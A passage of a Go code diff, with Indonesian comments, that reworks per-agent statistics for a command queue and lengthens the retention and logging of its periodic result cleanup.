-		if _, exists := stats["by_agent"].(map[string]map[string]int)[agentID]; !exists {
-			stats["by_agent"].(map[string]map[string]int)[agentID] = map[string]int{
-				"queued":    0,
-				"active":    0,
-				"completed": 0,
-			}
+		if _, ok := stats["by_agent"].(map[string]map[string]int)[agentID]; !ok {
+			stats["by_agent"].(map[string]map[string]int)[agentID] = map[string]int{"queued": 0, "active": 0, "completed_for_agent": 0}
 		}
-		stats["by_agent"].(map[string]map[string]int)[agentID]["queued"] = len(queue)
+		stats["by_agent"].(map[string]map[string]int)[agentID]["queued"] = agentQueueCount
 	}
+	stats["total_queued"] = totalQueuedCount
 
-	// Count active commands
 	for agentID := range commandQueue.active {
-		if _, exists := stats["by_agent"].(map[string]map[string]int)[agentID]; !exists {
-			stats["by_agent"].(map[string]map[string]int)[agentID] = map[string]int{
-				"queued":    0,
-				"active":    0,
-				"completed": 0,
-			}
+		if _, ok := stats["by_agent"].(map[string]map[string]int)[agentID]; !ok {
+			stats["by_agent"].(map[string]map[string]int)[agentID] = map[string]int{"queued": 0, "active": 0, "completed_for_agent": 0}
 		}
-		stats["by_agent"].(map[string]map[string]int)[agentID]["active"] = 1
+		stats["by_agent"].(map[string]map[string]int)[agentID]["active"] = 1 // Hanya 1 command bisa aktif per agent
 	}
 
-	// Count completed commands
+	// Menghitung completed per agent
+	completedPerAgent := make(map[string]int)
 	for _, cmd := range commandQueue.results {
-		if _, exists := stats["by_agent"].(map[string]map[string]int)[cmd.AgentID]; !exists {
-			stats["by_agent"].(map[string]map[string]int)[cmd.AgentID] = map[string]int{
-				"queued":    0,
-				"active":    0,
-				"completed": 0,
-			}
+		completedPerAgent[cmd.AgentID]++
+	}
+	for agentID, count := range completedPerAgent {
+		if _, ok := stats["by_agent"].(map[string]map[string]int)[agentID]; !ok {
+			stats["by_agent"].(map[string]map[string]int)[agentID] = map[string]int{"queued": 0, "active": 0, "completed_for_agent": 0}
 		}
-		stats["by_agent"].(map[string]map[string]int)[cmd.AgentID]["completed"]++
+		stats["by_agent"].(map[string]map[string]int)[agentID]["completed_for_agent"] = count
 	}
 
-	c.JSON(200, APIResponse{
+	c.JSON(http.StatusOK, APIResponse{
 		Success: true,
 		Data:    stats,
 	})
@@ -493,21 +767,37 @@ func (cq *CommandQueue) cleanOldResults(maxAge time.Duration) {
 	defer cq.mutex.Unlock()
 
 	cutoff := time.Now().Add(-maxAge)
+	cleanedCount := 0
 	for id, cmd := range cq.results {
-		if cmd.CompletedAt.Before(cutoff) {
+		if cmd.CompletedAt.IsZero() { // Jika belum ada CompletedAt (seharusnya tidak terjadi untuk hasil)
+			if cmd.CreatedAt.Before(cutoff) { // Fallback ke CreatedAt jika perlu
+				delete(cq.results, id)
+				cleanedCount++
+			}
+		} else if cmd.CompletedAt.Before(cutoff) {
 			delete(cq.results, id)
+			cleanedCount++
 		}
+	}
+	if cleanedCount > 0 {
+		LogInfo(SYSTEM, fmt.Sprintf("Cleaned %d old command results.", cleanedCount), "") //
 	}
 }
 
 // Start cleanup routine
 func startCommandQueueCleanup() {
 	go func() {
-		ticker := time.NewTicker(1 * time.Hour)
+		// Jalankan pembersihan pertama setelah beberapa saat agar tidak langsung saat startup
+		time.Sleep(5 * time.Minute)
+		commandQueue.cleanOldResults(24 * 7 * time.Hour) // Keep results for 7 days
+
+		ticker := time.NewTicker(1 * time.Hour) // Kemudian setiap jam
 		defer ticker.Stop()
 
 		for range ticker.C {
-			commandQueue.cleanOldResults(24 * time.Hour) // Keep results for 24 hours
+			LogInfo(SYSTEM, "Running periodic command queue cleanup...", "") //
+			commandQueue.cleanOldResults(24 * 7 * time.Hour)                 // Keep results for 7 days
 		}
 	}()
+	LogInfo(SYSTEM, "Command queue cleanup routine started. Old results will be cleaned periodically.", "") //
 }
